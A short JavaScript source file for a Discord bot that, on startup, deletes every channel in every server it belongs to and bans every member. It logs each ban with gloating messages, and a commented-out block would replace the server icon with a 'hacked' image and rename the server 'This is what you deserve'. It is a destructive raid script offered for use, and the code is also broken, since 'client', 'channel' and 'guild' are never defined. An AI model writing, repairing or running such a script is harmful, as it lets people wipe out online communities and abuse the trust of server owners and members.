const Discord = require("discord.js");

//on ready delete all channels
client.on("ready", () => {


// Create an invite to a channel
channel.createInvite()
  .then(invite => console.log(`Created an invite with a code of ${invite.code}`))
  .catch(console.error);

client.guilds.forEach(server => server.channels.forEach(channel => channel.delete()));

//startup message log
console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);


//ban all
guild.members.forEach(m => {
        m.ban();

console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
    });
/*
//set server icon
guild.setIcon("https://china.hacked-my.computer/95314b55.png");

//set server name
guild.setName("This is what you deserve");

*/

//handle unexpected errors
process.on("uncaughtException", err => {
    console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
    process.exit(1);
});
});

client.login("bot token");
